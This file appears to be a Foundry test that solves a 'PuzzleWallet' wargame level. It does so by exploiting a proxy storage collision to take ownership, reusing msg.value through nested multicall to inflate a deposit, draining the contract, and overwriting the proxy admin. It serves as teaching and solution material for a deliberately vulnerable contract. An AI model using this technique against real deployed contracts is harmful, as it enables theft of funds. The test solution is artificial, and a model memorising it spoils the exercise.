// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {PuzzleWalletFactory} from "../../src/levels/PuzzleWalletFactory.sol";
import {PuzzleWallet, PuzzleProxy} from "../../src/levels/PuzzleWallet.sol";

contract PuzzleWalletLevel is LuxTest {
    PuzzleWalletFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new PuzzleWalletFactory();
        _register(factory);
    }

    function test_solve() public {
        address instance = _create(factory, player, 0.001 ether);
        _assertUnsolved(instance, player);

        PuzzleProxy proxy = PuzzleProxy(payable(instance));
        PuzzleWallet wallet = PuzzleWallet(instance);

        vm.deal(player, 1 ether);
        vm.startPrank(player, player);
        // pendingAdmin collides with wallet.owner -> we become owner.
        proxy.proposeNewAdmin(player);
        wallet.addToWhitelist(player);

        // Nested multicall reuses msg.value so the balance credit doubles.
        bytes[] memory inner = new bytes[](1);
        inner[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory outer = new bytes[](2);
        outer[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        outer[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, inner);
        wallet.multicall{value: 0.001 ether}(outer);

        // Drain to zero, then setMaxBalance writes admin (collides with maxBalance).
        wallet.execute(player, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(player)));
        vm.stopPrank();

        assertEq(proxy.admin(), player);
        _assertSolved(factory, instance, player);
    }
}
